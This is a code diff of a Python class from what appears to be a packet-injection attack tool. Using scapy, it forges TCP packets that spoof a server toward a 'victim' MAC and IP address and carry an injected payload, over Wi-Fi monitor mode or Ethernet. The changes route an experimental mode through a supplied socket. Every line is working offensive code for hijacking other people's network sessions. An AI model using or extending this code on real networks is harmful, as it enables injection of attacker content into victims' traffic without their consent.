@@ -30,11 +30,11 @@ class Injector(object):
 
 
     ### Should be able to dict this?
-    def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, exp, expSocket, single = False):
+    def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, expSocket, single = False):
         """Inject function performs the actual injection using scapy."""
         global npackets
         npackets += 1
-        #sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
+        ###sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
         sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + bcolors.WARNING + vicmac + bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
         sys.stdout.flush()
         if ("mon" in self.interface):
@@ -47,9 +47,9 @@ class Injector(object):
                 packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
 
             ### Experimental mode
-            if exp:
+            if expSocket:
                 try:
-                    sendp(packet, iface = self.interface, verbose = 0)
+                    expSocket.send(packet, iface = self.interface, verbose = 0)
                 except:
                     pass
 
@@ -59,9 +59,8 @@ class Injector(object):
                 except:
                     pass
 
-
             if single:
-                #sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r\n" + bcolors.ENDC)
+                ####sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r\n" + bcolors.ENDC)
                 sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + bcolors.WARNING + vicmac + bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
                 time.sleep(1)
                 exit(1)
@@ -75,11 +74,10 @@ class Injector(object):
             else:
                 packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
 
-
             ### Experimental mode
-            if exp:
+            if expSocket:
                 try:
-                    sendp(packet,iface = self.interface, verbose = 0)
+                    expSocket.send(packet,iface = self.interface, verbose = 0)
                 except:
                     pass
             else:
